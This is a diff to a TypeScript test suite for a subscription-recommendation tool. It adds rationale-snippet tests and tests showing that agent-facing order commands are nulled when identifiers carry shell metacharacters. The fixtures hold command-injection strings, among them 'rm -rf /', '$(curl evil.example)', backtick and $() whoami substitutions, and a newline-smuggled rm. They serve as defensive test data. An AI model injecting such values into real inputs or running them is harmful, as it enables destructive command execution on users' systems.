@@ -229,6 +229,222 @@ describe("getRecommendations", () => {
     expect(report.recommendations.some((r) => r.opportunityType === "Net-new")).toBe(true);
     expect(report.recommendations.some((r) => r.opportunityType === "Upsell")).toBe(true);
   });
+
+  // #655 / UXR F5: every rec carries a short "at-a-glance why" for the
+  // `Rationale` column in `recommendations list`. Customer-specific
+  // quantitative anchor for seat gaps (a ratio), categorical form for
+  // cross-sell rules and zero-active-subs.
+  it("populates rationaleSnippet on every recommendation across all emit paths", () => {
+    const subs = [
+      makeSub({ companyId: "c1", companyName: "Has Productivity", quantity: 100, price: 22 }),
+      makeSub({
+        companyId: "c1", companyName: "Has Productivity",
+        productId: "p2", productName: "Microsoft 365 Business Basic [New Commerce Experience]",
+        quantity: 20, price: 6,
+      }),
+    ];
+    const companies = [
+      { id: "c1", name: "Has Productivity" },
+      { id: "c2", name: "Ghost Co" },
+    ];
+    const report = getRecommendations(subs, undefined, companies);
+
+    // Every rec has a non-empty snippet that fits the table budget.
+    for (const rec of report.recommendations) {
+      expect(rec.rationaleSnippet).toBeTruthy();
+      expect(rec.rationaleSnippet.length).toBeLessThanOrEqual(40);
+    }
+
+    // Seat-gap snippets are a quantity ratio ("20/100 productivity").
+    const seatGaps = report.recommendations.filter((r) => r.type === "seat_gap");
+    expect(seatGaps.length).toBeGreaterThan(0);
+    for (const rec of seatGaps) {
+      expect(rec.rationaleSnippet).toMatch(/^\d+\/\d+ /);
+    }
+
+    // Cross-sell rule snippets are categorical ("no backup", "no security", …).
+    const crossSells = report.recommendations.filter(
+      (r) => r.type === "cross_sell" && r.companyId === "c1",
+    );
+    expect(crossSells.length).toBeGreaterThan(0);
+    for (const rec of crossSells) {
+      expect(rec.rationaleSnippet).toMatch(/^no /);
+    }
+
+    // Zero-active-subs path uses the fixed "no active subs" snippet.
+    const zeroSub = report.recommendations.find(
+      (r) => r.companyId === "c2" && r.title.includes("No active subscriptions"),
+    );
+    expect(zeroSub).toBeDefined();
+    expect(zeroSub!.rationaleSnippet).toBe("no active subs");
+  });
+
+  // orderCommand is the agent's handle on a recommendation — CLAUDE.md and
+  // skill.md document "extract orderCommand from --json and run it." That
+  // makes the agent the unintentional executor of any value we interpolate
+  // into the string, so it must use a strict-identifier form and refuse to
+  // emit anything that could be parsed as a flag override by Commander
+  // after the REPL tokenizer re-splits it. The previous shape used the
+  // partner-facing display name (`--company "${companyName}"`), which broke
+  // out of its quote frame when the name contained a `"`.
+  describe("orderCommand is constructed from safe identifiers only", () => {
+    it("emits a quoted display name + safe argv for a non-UUID companyId", () => {
+      // #498's buildOrderArtifacts uses the display name (quoted) in the
+      // string form when companyId is not UUID-shaped, but the argv form
+      // (`orderArgs`) lands the value as a single argv element with no
+      // shell involvement. The companyName here ("Needs Backup") clears
+      // isSafeDisplayName — no shell metacharacters — so the artifacts
+      // are populated.
+      const subs = [
+        makeSub({ companyId: "c1", companyName: "Needs Backup" }),
+        makeSub({ companyId: "c2", companyName: "Has Backup" }),
+        makeSub({
+          companyId: "c2", companyName: "Has Backup",
+          productId: "prod-bk", productName: "Datto SaaS Protection", price: 5,
+        }),
+      ];
+      const report = getRecommendations(subs);
+      const rec = report.recommendations.find((r) => r.companyId === "c1" && r.title.includes("Datto"));
+      expect(rec).toBeDefined();
+      // Display string: quoted display name (companyId not UUID-shaped).
+      expect(rec!.orderCommand).toContain('--company "Needs Backup"');
+      // Safe argv form (#498): customer name as a single argv element,
+      // no quoting / escaping / shell involvement.
+      expect(rec!.orderArgs).toEqual([
+        "pax8",
+        "orders",
+        "create",
+        "--company",
+        "Needs Backup",
+        "--product",
+        "prod-bk",
+        "--quantity",
+        "50",
+      ]);
+    });
+
+    it("emits null orderCommand when companyId fails the safe-identifier check", () => {
+      // A malicious upstream that injected shell metacharacters into the
+      // companyId must not produce a usable orderCommand at all.
+      const subs = [
+        makeSub({ companyId: 'c1"; rm -rf /; "', companyName: "Evil Co" }),
+        makeSub({ companyId: "c2", companyName: "Has Backup" }),
+        makeSub({
+          companyId: "c2", companyName: "Has Backup",
+          productId: "prod-bk", productName: "Datto SaaS Protection", price: 5,
+        }),
+      ];
+      const report = getRecommendations(subs);
+      const rec = report.recommendations.find(
+        (r) => r.companyId === 'c1"; rm -rf /; "' && r.title.includes("Datto"),
+      );
+      expect(rec).toBeDefined();
+      expect(rec!.orderCommand).toBeNull();
+      // Parity: the safe argv form (#498) also collapses to null when the
+      // gate fails, so an agent that prefers `orderArgs` can't pick up
+      // a hostile companyId either.
+      expect(rec!.orderArgs).toBeNull();
+    });
+
+    it("emits null orderCommand when companyName has shell metacharacters", () => {
+      // The H-2 vector: a hostile API-supplied display name breaks out of
+      // the `--company "${name}"` quote frame. The gate collapses both
+      // forms to null on any char that ACTUALLY breaks the quote frame:
+      // `"`, `\`, backtick, `$`, newline/CR, NUL. After #509's consumer
+      // migration onto argv, that's the only remaining risk surface for
+      // the string form.
+      const subs = [
+        makeSub({ companyId: "c1", companyName: 'Acme" $(curl evil.example) "' }),
+        makeSub({ companyId: "c2", companyName: "Has Backup" }),
+        makeSub({
+          companyId: "c2", companyName: "Has Backup",
+          productId: "prod-bk", productName: "Datto SaaS Protection", price: 5,
+        }),
+      ];
+      const report = getRecommendations(subs);
+      const rec = report.recommendations.find((r) => r.companyId === "c1" && r.title.includes("Datto"));
+      expect(rec).toBeDefined();
+      expect(rec!.orderCommand).toBeNull();
+      expect(rec!.orderArgs).toBeNull();
+    });
+
+    // After #509's consumer migration, the gate was relaxed to allow chars
+    // that are literal inside a double-quoted shell string (`;`, `|`, `&`,
+    // `<`, `>`). Names with `&` are the load-bearing case — `AT&T`,
+    // `Procter & Gamble`, `Johnson & Johnson` are real partner names that
+    // used to collapse to null. They now produce both forms.
+    it("admits common shell-safe-when-quoted chars in companyName (#509 relaxation)", () => {
+      const subs = [
+        makeSub({ companyId: "c1", companyName: "AT&T Communications" }),
+        makeSub({ companyId: "c2", companyName: "Has Backup" }),
+        makeSub({
+          companyId: "c2", companyName: "Has Backup",
+          productId: "prod-bk", productName: "Datto SaaS Protection", price: 5,
+        }),
+      ];
+      const report = getRecommendations(subs);
+      const rec = report.recommendations.find(
+        (r) => r.companyId === "c1" && r.title.includes("Datto"),
+      );
+      expect(rec).toBeDefined();
+      // String form: the name lands inside double quotes, `&` is literal there.
+      expect(rec!.orderCommand).toContain('--company "AT&T Communications"');
+      // Argv form: name is one argv element regardless of contents.
+      expect(rec!.orderArgs).toContain("AT&T Communications");
+    });
+
+    it("still rejects companyName with quote-frame-breaking chars", () => {
+      // Pin the chars that MUST still null-collapse. Each entry breaks the
+      // double-quote frame in a different way; running any of these through
+      // `bash -c '<orderCommand>'` would execute attacker code.
+      const breakers = [
+        'Acme"',                       // closes the quote
+        'Acme\\',                      // backslash escape
+        'Acme`whoami`',                // backtick command substitution
+        'Acme$(whoami)',               // $() command substitution
+        'Acme${HOME}',                 // $VAR expansion
+        "Acme\nrm -rf",                // newline ends the line
+      ];
+      for (const hostile of breakers) {
+        const subs = [
+          makeSub({ companyId: "c1", companyName: hostile }),
+          makeSub({ companyId: "c2", companyName: "Has Backup" }),
+          makeSub({
+            companyId: "c2", companyName: "Has Backup",
+            productId: "prod-bk", productName: "Datto SaaS Protection", price: 5,
+          }),
+        ];
+        const report = getRecommendations(subs);
+        const rec = report.recommendations.find(
+          (r) => r.companyId === "c1" && r.title.includes("Datto"),
+        );
+        expect(rec, `companyName=${JSON.stringify(hostile)} should produce a rec`).toBeDefined();
+        expect(rec!.orderCommand, `companyName=${JSON.stringify(hostile)} should null-collapse orderCommand`).toBeNull();
+        expect(rec!.orderArgs, `companyName=${JSON.stringify(hostile)} should null-collapse orderArgs`).toBeNull();
+      }
+    });
+
+    it("emits null orderCommand when productId is not safe-identifier-shaped", () => {
+      // Demo fixture with a productId carrying shell metacharacters. Defense
+      // in depth even though the real Pax8 API only returns UUID-shaped IDs.
+      const subs = [
+        makeSub({ companyId: "c1", companyName: "Needs Backup" }),
+        makeSub({ companyId: "c2", companyName: "Has Backup" }),
+        makeSub({
+          companyId: "c2", companyName: "Has Backup",
+          productId: 'prod-bk" --extra "', productName: "Datto SaaS Protection", price: 5,
+        }),
+      ];
+      const report = getRecommendations(subs);
+      const rec = report.recommendations.find((r) => r.companyId === "c1" && r.title.includes("Datto"));
+      // The rec may still exist (peer product was found), but it can't
+      // produce a runnable command with that productId.
+      if (rec) {
+        expect(rec.orderCommand).toBeNull();
+        expect(rec.orderArgs).toBeNull();
+      }
+    });
+  });
 });
 
 describe("findUpsellCohort", () => {
